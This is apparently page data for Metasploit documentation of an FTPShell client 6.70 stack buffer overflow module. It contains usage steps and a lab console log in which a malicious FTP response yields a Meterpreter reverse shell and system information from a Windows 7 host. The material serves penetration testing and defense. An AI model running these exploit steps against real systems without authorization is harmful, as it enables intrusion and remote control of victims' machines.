{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/ftp/ftpshell_cli_bof","result":{"data":{"moduleMetadataJson":{"id":"8504fc72-a552-59c8-9a4a-64a6a2276541","name":"FTPShell client 6.70 (Enterprise edition) Stack Buffer Overflow","fullname":"exploit/windows/ftp/ftpshell_cli_bof","description":"This module exploits a buffer overflow in the FTPShell client 6.70 (Enterprise\n          edition) allowing remote code execution.","rank":300,"fields":{"detailsSlug":"/modules/details/exploit/windows/ftp/ftpshell_cli_bof","documentationSlug":"/modules/documentation/exploit/windows/ftp/ftpshell_cli_bof","referencesSlug":"/modules/references/exploit/windows/ftp/ftpshell_cli_bof"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>FTPShell client 6.70 (Enterprise edition) is affected by a stack-based buffer overflow vulnerability which can be leveraged by an attacker to execute arbitrary code on the target. The vulnerability is caused by improper bounds checking of the PWD command. This module has been tested successfully on Windows 7 SP1. The vulnerable application is available for download at <a href=\"http://www.ftpshell.com/downloadclient.htm\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">ftpshell.com</a>.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">1. Install a vulnerable FTPShell client 6.70\n2. Start `msfconsole`\n3. Do `use exploit/windows/ftp/ftpshell_cli_bof`\n4. Do `set PAYLOAD windows/meterpreter/reverse_tcp`\n5. Do `set LHOST ip`\n6. Do `exploit`\n7. Conect to the FTP server using FTPShell client 6.70\n8. Verify the Meterpreter session is opened</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"ftpshell-client-670-on-windows-7-sp1-x64\" style=\"position:relative;\"><a href=\"#ftpshell-client-670-on-windows-7-sp1-x64\" aria-label=\"ftpshell client 670 on windows 7 sp1 x64 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>FTPShell client 6.70 on Windows 7 SP1 x64</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/windows/ftp/ftpshell_cli_bof \nmsf exploit(windows/ftp/ftpshell_cli_bof) &gt; set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD =&gt; windows/meterpreter/reverse_tcp\nmsf exploit(windows/ftp/ftpshell_cli_bof) &gt; set LHOST 172.16.106.129 \nLHOST =&gt; 172.16.106.129\nmsf exploit(windows/ftp/ftpshell_cli_bof) &gt; exploit \n[*] Exploit running as background job 0.\n\n[*] Started reverse TCP handler on 172.16.106.129:4444 \n[*] Please ask your target(s) to connect to 172.16.106.129:21\n[*] Server started.\nmsf exploit(windows/ftp/ftpshell_cli_bof) &gt; [*] 172.16.106.128 - connected.\n[*] 172.16.106.128 - Response: Sending 220 Welcome\n[*] 172.16.106.128 - Request: USER anonymous\n[*] 172.16.106.128 - Response: sending 331 OK\n[*] 172.16.106.128 - Request: PASS anonymous@anon.com\n[*] 172.16.106.128 - Response: Sending 230 OK\n[*] 172.16.106.128 - Request: PWD\n[*] 172.16.106.128 - Request: Sending the malicious response\n[*] Sending stage (179779 bytes) to 172.16.106.128\n[*] Meterpreter session 1 opened (172.16.106.129:4444 -&gt; 172.16.106.128:49263) at 2018-06-27 11:19:38 -0400\n\nmsf exploit(windows/ftp/ftpshell_cli_bof) &gt; sessions 1\n[*] Starting interaction with 1...\n\nmeterpreter &gt; sysinfo \nComputer        : PC\nOS              : Windows 7 (Build 7601, Service Pack 1).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 1\nMeterpreter     : x86/windows\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"8504fc72-a552-59c8-9a4a-64a6a2276541"}}}